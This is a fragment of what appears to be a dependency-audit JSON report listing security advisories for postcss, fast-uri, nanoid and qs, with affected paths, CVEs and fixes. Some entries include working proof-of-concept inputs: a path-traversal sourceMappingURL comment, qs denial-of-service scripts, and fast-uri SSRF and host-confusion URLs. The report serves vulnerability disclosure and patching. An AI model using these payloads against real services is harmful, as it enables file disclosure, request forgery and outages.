+      "title": "PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-69153"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.22",
+      "github_advisory_id": "GHSA-fxqj-rqcc-2cmp",
+      "recommendation": "Upgrade to version 8.5.23 or later",
+      "patched_versions": ">=8.5.23",
+      "updated": "2026-08-03T17:11:40.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-fxqj-rqcc-2cmp"
+    },
+    "1130720": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            "apps__api>fastify>@fastify/ajv-compiler>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-7p8r-x3mc-p8w7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-18446\n- https://github.com/fastify/fast-uri/commit/f3c6c905f47831007490f466c5945012e905cc52\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.2\n- https://github.com/advisories/GHSA-7p8r-x3mc-p8w7",
+      "created": "2026-08-03T19:16:43.000Z",
+      "id": 1130720,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` v4.1.1 and earlier require a literal `//` to recognize a URI authority, so a reference that uses `\\\\`, `/\\`, or `\\/` as the authority introducer (in place of `//`, after an optional scheme) is parsed with no authority: the sequence and everything after it fold into the path. Node's native WHATWG `URL` (used by `fetch()`, `undici`, and Node's `http`/`https` clients) instead treats `\\` as interchangeable with `/` for special schemes (`http`, `https`, `ws`, `wss`, `ftp`, `file`), so the two parsers extract different hosts from the same input.\n\nFor example, `fast-uri` resolves `\\\\evil.com/path` against base `https://allowed.com/` to `https://allowed.com/%5C%5Cevil.com/path` (confined to the trusted host), while Node's WHATWG URL resolves the same reference to `https://evil.com/path`.\n\nApplications that use `fast-uri` to enforce host-based policy (allowlists, denylists, loopback/SSRF filtering, redirect validation, outbound proxy routing) before passing the same URL into Node's URL or `fetch()` consumers see a policy/use desync and can be steered to an unintended destination.\n\n### Patches\n\nUpgrade to `fast-uri` v4.1.2, v3.1.5, v2.4.4.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to host confusion via backslash authority introducer",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-18446"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.5",
+      "github_advisory_id": "GHSA-7p8r-x3mc-p8w7",
+      "recommendation": "Upgrade to version 3.1.5 or later",
+      "patched_versions": ">=3.1.5",
+      "updated": "2026-08-03T19:16:43.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-7p8r-x3mc-p8w7"
+    },
+    "1138811": {
+      "findings": [
+        {
+          "version": "3.3.15",
+          "paths": [
+            "apps__web>next>postcss>nanoid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-67214\n- https://github.com/ai/nanoid/commit/6ccc67bbaba71d3d77a21d9b636f4171a268ce49\n- https://github.com/ai/nanoid/releases/tag/5.1.16\n- https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-negative-size-in-non-secure-module\n- https://github.com/ai/nanoid/pull/600\n- https://github.com/ai/nanoid/pull/601\n- https://github.com/ai/nanoid/commit/e835c9b71eab832bc6106944bdd26ea96cf2c66d\n- https://github.com/advisories/GHSA-28wg-ghj8-5hjv",
+      "created": "2026-07-29T15:31:12.000Z",
+      "id": 1138811,
+      "npm_advisory_id": null,
+      "overview": "nanoid (Nano ID) before 5.1.16 contains an infinite loop in the customAlphabet and nanoid functions of its non-secure module (nanoid/non-secure). When these functions are given a negative size, the loop counter is decremented from a negative value and never reaches its termination condition, spinning indefinitely and hanging the calling thread. An application that passes an unvalidated, attacker-controlled negative size to these functions is exposed to a denial-of-service condition.",
+      "reported_by": null,
+      "title": "nanoid: non-secure generators can loop indefinitely with negative size",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-67214"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nanoid",
+      "vulnerable_versions": "<3.3.16",
+      "github_advisory_id": "GHSA-28wg-ghj8-5hjv",
+      "recommendation": "Upgrade to version 3.3.16 or later",
+      "patched_versions": ">=3.3.16",
+      "updated": "2026-08-07T20:53:01.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-28wg-ghj8-5hjv"
+    },
+    "1139427": {
+      "findings": [
+        {
+          "version": "3.3.15",
+          "paths": [
+            "apps__web>next>postcss>nanoid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-67213\n- https://github.com/ai/nanoid/commit/cb3626d0f3342fdf179cd425fd9c4fbb92c7d0e7\n- https://github.com/ai/nanoid/releases/tag/5.1.6\n- https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-zero-size-in-customalphabet-and-customrandom\n- https://github.com/ai/nanoid/commit/f9d13f150847d117877adee3460a46eceb0cf49b\n- https://github.com/ai/nanoid/releases/tag/3.3.17\n- https://github.com/ai/nanoid/commit/e10f8d40ce9d1ab47f66d65a16b48086432730d0\n- https://github.com/ai/nanoid/releases/tag/3.3.18\n- https://github.com/advisories/GHSA-2v37-7h3g-55p8",
+      "created": "2026-07-29T15:31:12.000Z",
+      "id": 1139427,
+      "npm_advisory_id": null,
+      "overview": "nanoid (Nano ID) before 5.1.6 contains an infinite loop in the customAlphabet and customRandom functions. When these functions are configured with a size of 0, the internal generation loop never satisfies its exit condition and spins indefinitely, hanging the calling thread. An application that passes an unvalidated, attacker-controlled size of 0 to these functions is exposed to a denial-of-service condition.",
+      "reported_by": null,
+      "title": "nanoid: custom generators can loop indefinitely when size is zero",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-67213"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nanoid",
+      "vulnerable_versions": "<3.3.18",
+      "github_advisory_id": "GHSA-2v37-7h3g-55p8",
+      "recommendation": "Upgrade to version 3.3.18 or later",
+      "patched_versions": ">=3.3.18",
+      "updated": "2026-08-13T15:43:02.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-2v37-7h3g-55p8"
+    },
+    "1139510": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps__web>next>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-r28c-9q8g-f849\n- https://github.com/postcss/postcss/commit/95663d3eb7ba26f4854dd19d3b4f4425760cf56c\n- https://github.com/postcss/postcss/releases/tag/8.5.18\n- https://github.com/advisories/GHSA-r28c-9q8g-f849",
+      "created": "2026-07-24T16:24:55.000Z",
+      "id": 1139510,
+      "npm_advisory_id": null,
+      "overview": "## Vulnerability Details\n\n**File**: `lib/previous-map.js`\n**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)\n\n\n### Root Cause\nPostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a \"previous source map.\" This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).\n\n`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.\n\n8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in `.map` remains readable through this path in the current release (8.5.16).\n\nOnce loaded, `MapGenerator.isMap()` treats the mere presence of a loaded \"previous map\" as an implicit request to generate `result.map`, even when the caller never set the `map` option. If the loaded map has a `sourcesContent` field (common for maps emitted by bundlers/transpilers), that content is merged into `result.map` and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.\n\n### Attack Scenario\n1. A service accepts user-submitted CSS and runs it through PostCSS to lint/format/transform it, e.g. `postcss().process(userCss, { from: '/app/uploads/user123/input.css', to: '/app/uploads/user123/output.css' })` — idiomatic usage; `map` option untouched.\n2. Attacker submits CSS containing `/*# sourceMappingURL=../../../../some/other/app/dist/bundle.js.map */` (or an absolute path if `from` is unset).\n3. PostCSS reads that `.map` file and folds its `sourcesContent` into `result.map`.\n4. The service does what most build pipelines do with a truthy `result.map` — writes it next to the CSS output or returns it via API (source maps are meant to be consumed by browser devtools, so this is commonly public/served).\n5. Attacker retrieves the emitted map and reads out the traversed file's content.\n\n### Impact\nDisclosure of the contents of arbitrary `.map` files reachable via path traversal (or absolute path when `from` is unset) from the process's filesystem. Affects any application processing CSS it does not fully trust without explicitly passing `map: false`. No authentication or user interaction beyond submitting CSS text is required.\n\n### Vulnerable Code\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n\nloadMap(file, prev) {\n  ...\n  } else if (this.annotation) {\n    let map = this.annotation\n    if (file) map = join(dirname(file), map)\n    let unknown = this.loadFile(map, file, false)\n    ...\n  }\n}\n```\n\n### Recommended Fix\nConstrain the resolved path to remain inside the CSS file's own directory instead of relying solely on a filename-extension check:\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (!cssFile) return undefined\n    let root = resolve(dirname(cssFile))\n    let resolvedPath = resolve(root, path)\n    if (resolvedPath !== root && !resolvedPath.startsWith(root + sep)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\nI've implemented, tested (full existing test suite — 660/660 passing, plus new PoC-based regression checks for both the traversal and legitimate same-directory cases), and can share this fix on request or via a private fork if invited.\n\n### Verification\nDynamically confirmed on v8.5.16 (current npm release / repo HEAD) via a standalone Node.js harness against `lib/postcss.js`: a \"secret\" `.map` file placed two directories outside a simulated project directory was read via a crafted `sourceMappingURL` comment in otherwise-innocuous CSS, with its `sourcesContent` appearing verbatim in `result.map.toString()` — with no `map` option set by the caller. A second harness confirmed the simpler no-`from` case reads an absolute path directly. A third harness confirmed `map: false` is the only current workaround. The attached fix branch closes both vectors while keeping all 660 existing unit tests green.",
+      "reported_by": null,
+      "title": "PostCSS: Path Traversal in Previous Source Map Auto-Loading (sourceMappingURL) leads to Arbitrary .map File Disclosure",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-73646"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.17",
+      "github_advisory_id": "GHSA-r28c-9q8g-f849",
+      "recommendation": "Upgrade to version 8.5.18 or later",
+      "patched_versions": ">=8.5.18",
+      "updated": "2026-08-13T17:55:56.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-r28c-9q8g-f849"
+    },
+    "1158506": {
+      "findings": [
+        {
+          "version": "6.15.3",
+          "paths": [
+            "apps__api>@nestjs/platform-express>express>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883\n- https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82562\n- https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464\n- https://github.com/advisories/GHSA-x5fp-wj9c-mxmx",
+      "created": "2026-09-02T14:46:57.000Z",
+      "id": 1158506,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.",
+      "reported_by": null,
+      "title": "qs array-limit bypass via bracket-key comma parsing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82562"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.14.2 <=6.15.3",
+      "github_advisory_id": "GHSA-x5fp-wj9c-mxmx",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:46:58.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-x5fp-wj9c-mxmx"
+    },
+    "1158507": {
+      "findings": [
+        {
+          "version": "6.15.3",
+          "paths": [
+            "apps__api>@nestjs/platform-express>express>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82417\n- https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6\n- https://github.com/advisories/GHSA-4mjr-xmp4-gh2g",
+      "created": "2026-09-02T14:45:13.000Z",
+      "id": 1158507,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` — the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError\nnode poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+      "reported_by": null,
+      "title": "qs: Denial of Service via Attacker Controlled isBuffer",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82417"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=2.2.5 <6.16.0",
+      "github_advisory_id": "GHSA-4mjr-xmp4-gh2g",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:45:15.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-4mjr-xmp4-gh2g"
+    },
+    "1158524": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            "apps__api>fastify>@fastify/ajv-compiler>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-f65p-4m7j-42xc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-75975\n- https://github.com/fastify/fast-uri/commit/3728465caacef4b16bc84b7d14760f1c8fe41595\n- https://github.com/fastify/fast-uri/commit/607bfbe953f28a14c2e06ae64aff38c81ca2937f\n- https://github.com/fastify/fast-uri/commit/9161eded1ff55fad9d9714c6ad6c0f0283547799\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.5\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.6\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.3\n- https://github.com/advisories/GHSA-f65p-4m7j-42xc",
+      "created": "2026-09-02T15:43:30.000Z",
+      "id": 1158524,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` does not validate the complete RFC 3986 grammar for bracketed IPv6 literals, so a malformed literal with invalid trailing text is silently truncated to a different valid IPv6 address with no error reported. For example, `normalize('http://[::not-valid]/private')` returns `http://[::]/private`, and `[fc00::not-hex]` and `[fe80::not-hex]` collapse to `[fc00::]` and `[fe80::]`. An application that normalizes an untrusted URL before an outbound request, redirect, or host-policy check can be routed to a local or private address such as loopback (`::1`), unique-local, or link-local. Because `parse().error` is unset for these inputs, checking it does not protect the consumer.\n\n### Patches\n\nUpgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. Malformed IPv6 literals are now rejected with a host error instead of being normalized to a valid address.\n\n### Workarounds\n\nReject untrusted URLs whose host is a bracketed IPv6 literal before passing them to `fast-uri`, or route outbound requests against an explicit allowlist of addresses rather than trusting the normalized host.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to server-side request forgery via malformed IPv6 normalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-75975"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.6",
+      "github_advisory_id": "GHSA-f65p-4m7j-42xc",
+      "recommendation": "Upgrade to version 3.1.6 or later",
+      "patched_versions": ">=3.1.6",
+      "updated": "2026-09-02T15:43:32.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-f65p-4m7j-42xc"
+    },
+    "1158527": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            "apps__api>fastify>@fastify/ajv-compiler>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-fph4-wmhf-6fwf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-75899\n- https://github.com/fastify/fast-uri/commit/2642290672e7211c990aaed3749c2ce667d0af4f\n- https://github.com/fastify/fast-uri/commit/8c15dbe94ec50bb8e595791ebb42c35cef0fd304\n- https://github.com/fastify/fast-uri/commit/ae92a4c5d8c4b6c9e447f048d5fcbde7eebd5514\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.5\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.6\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.3\n- https://github.com/advisories/GHSA-fph4-wmhf-6fwf",
+      "created": "2026-09-02T15:42:39.000Z",
+      "id": 1158527,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` decodes a hostname's percent escapes twice in a single `normalize()` or `resolve()` call: once during parsing and again during authority recomposition. A nested percent-encoded host therefore survives the first decode and is turned into a live destination by the second, so `normalize('http://%256c%256f%2563%2561%256c%2568%256f%2573%2574/')` returns `http://localhost/`. Applications that normalize or resolve an untrusted URI before an SSRF check, redirect validation, or host allowlist can be steered to a different destination, including internal addresses such as loopback or a cloud metadata endpoint, than the encoded input appeared to contain. This is an incomplete-fix variant of CVE-2026-6322, whose encoded-authority-delimiter fix introduced the second decode.\n\n### Patches\n\nFixed in `fast-uri` 2.4.5, 3.1.6, and 4.1.3.\n\n### Workarounds\n\nReject untrusted URIs whose host component contains an encoded percent sign (`%25`) before passing them to `normalize()` or `resolve()`.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to server-side request forgery via repeated hostname percent-decoding",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-75899"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.1.2 <3.1.6",
+      "github_advisory_id": "GHSA-fph4-wmhf-6fwf",
+      "recommendation": "Upgrade to version 3.1.6 or later",
+      "patched_versions": ">=3.1.6",
+      "updated": "2026-09-02T15:42:41.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-174",
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-fph4-wmhf-6fwf"
+    },
+    "1158530": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            "apps__api>fastify>@fastify/ajv-compiler>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-jqff-g426-hqxp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-76172\n- https://github.com/fastify/fast-uri/commit/37f3417c82994279656854f83ce938acd81c3862\n- https://github.com/fastify/fast-uri/commit/a941e626411f576f8d90883231e57b6c9d0ff98b\n- https://github.com/fastify/fast-uri/commit/c6a74bfd9d8c6b0df5362b3c7ae88d8021cb1e39\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.5\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.6\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.3\n- https://github.com/advisories/GHSA-jqff-g426-hqxp",
+      "created": "2026-09-02T15:41:53.000Z",
+      "id": 1158530,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` decodes percent-encoded characters in the scheme component with the legacy global `unescape()` and serializes the result back as raw characters, without re-escaping it or validating it as a scheme. A scheme that decodes to characters outside the RFC 3986 scheme grammar can therefore introduce structure the original input did not contain.\n\nFor example, `%2f%2fevil.example:/pwn` parses with no authority (`parse().host` is `undefined`), but `resolve()` and `normalize()` return `//evil.example:/pwn`, which reparses with host `evil.example`. The `%uXXXX` form (`%u002f%u002fevil.example:/pwn`) produces the same result, and a scheme containing `%0d%0a` reaches the output as a raw CR LF.\n\nApplications that normalize or resolve untrusted URLs before a redirect check, host allowlist, or outbound request decision, especially ones that treat a missing authority as same-origin, can be steered to an attacker-chosen authority, and a normalized URI placed in a response header can carry an injected CR LF.\n\n### Patches\n\nUpgrade to `fast-uri` >= 4.1.3, or >= 3.1.6 in the v3.x release line, or >= 2.4.5 in the v2.x release line.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to host confusion via percent-encoded scheme normalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-76172"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.6",
